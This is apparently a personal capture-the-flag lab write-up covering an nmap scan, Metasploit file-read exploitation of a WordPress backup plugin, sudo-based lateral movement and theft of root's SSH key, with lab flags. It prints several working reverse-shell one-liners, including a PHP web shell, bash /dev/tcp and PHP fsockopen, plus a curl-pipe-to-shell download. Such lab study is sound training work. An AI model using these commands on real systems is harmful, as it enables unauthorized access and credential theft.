---
title: nmap-privilege-escalation
aliases: []
tags:
- tool/nmap
- attack/privilege-escalation
category: tools
status: draft
date_created: '2026-08-26'
date_modified: '2026-08-26'
source: gettingstarted.md
related_tools:
- '[[nmap]]'
- '[[searchsploit]]'
- '[[msfconsole]]'
- '[[psfalcon]]'
- '[[invoke-falconrtr]]'
- '[[get-falconhost]]'
- '[[get-240token]]'
related_techniques: []
related_tactics: []
related_services:
- '[[ssh]]'
- '[[http]]'
related_os:
- '[[/home]]'
- '[[/home/user2]]'
- '[[/root/.ssh]]'
- '[[/root/.ssh/authorized_keys]]'
- '[[/root/.ssh/id_rsa]]'
- '[[/root/.ssh/id_rsa.pub]]'
related_notes: []
mitre_tactic: TA0012
mitre_technique: T1548.002
real_path: ''
port: ''
protocol: ''
os: ''
---

# nmap-privilege-escalation

## Nmap Scan
```bash
# nmap, required -Pn because was not responding to pings
└─$ nmap -sC -sV 83.136.252.24 -Pn
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-11 18:41 AEST
Nmap scan report for 83-136-252-24.uk-lon1.upcloud.host (83.136.252.24)
Host is up (0.32s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 cd:cd:55:c0:fe:dd:01:b5:17:81:fb:7d:b0:cc:d1:c0 (RSA)
|   256 42:a1:b8:83:1e:a8:d7:0a:f9:c6:c4:40:2a:6b:4c:fe (ECDSA)
|_  256 3a:59:d7:5a:3e:0f:06:a2:92:fe:52:19:b4:14:e4:1b (ED25519)
32778/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Recommended Modules
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 71.97 seconds
```

## Metasploit Exploit
```bash
searchsploit Simple Backup Plugin 2.7.1

msfconsole
use auxiliary/scanner/http/wp_simple_backup_file_read
options
set RHOSTS 83.136.252.24
set RPORT 43765
set FILEPATH /flag.txt
exploit

[+] File saved in: /home/dbcyph0n/.msf4/loot/20230911190502_default_83.136.252.24_simplebackup.tra_071136.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Flag Extraction
```bash
└─$ cat /home/dbcyph0n/.msf4/loot/20230911190502_default_83.136.252.24_simplebackup.tra_071136.txt
HTB{my_f1r57_h4ck}
```

## Description
The user `user1` attempts to escalate privileges by accessing the `user2` directory and attempting to read a `flag.txt` file. The user then uses `sudo` to switch to the `user2` user and successfully reads the `flag.txt` file. Additionally, the user explores the `root` user's `.ssh` directory to view and modify the `id_rsa` and `authorized_keys` files.

The system includes free software with distribution terms described in individual files. Ubuntu provides no warranty.

The following commands and scripts were executed to retrieve a flag and establish a reverse shell connection:

```bash
root@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~# ls
flag.txt
root@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~# cat flag.txt
HTB{pr1v1l363_35c4l4710n_2_r007}
root@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~#
```

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.93/9005 0>&1'"); ?>
```

```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.93/9001 0>&1'
```

```bash
curl -L http://10.10.14.93/linpeas.sh | sh
```

```bash
sudo /usr/bin/php -r '$sock=fsockopen("10.10.14.93",9006);exec("/bin/sh -i <&3 >&3 2>&3");'
```

## Commands and Output
```sh
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ cd /home
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home$ ls
user1  user2
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home$ cd user2
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ ls
flag.txt
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ cat flag.txt
cat: flag.txt: Permission denied
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ ls -la
...
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ sudo -l
...
user1@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/home/user2$ sudo -u user2 /bin/bash
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ ls
flag.txt
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ cat flag.txt
HTB{l473r4l_m0v3m3n7_70_4n07h3r_u53r}
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ ls -la
...
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:~$ cd /root/.ssh
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ ls -la
...
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ cat id_rsa
...
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ nano id_rsa
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ chmod 600 id_rsa
user2@ng-819475-gettingstartedprivesc-nyzpf-778dcf5d95-g9jl5:/root/.ssh$ ssh root@94.237.59.206 -p 57855 -i id_rsa
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64)
...
```

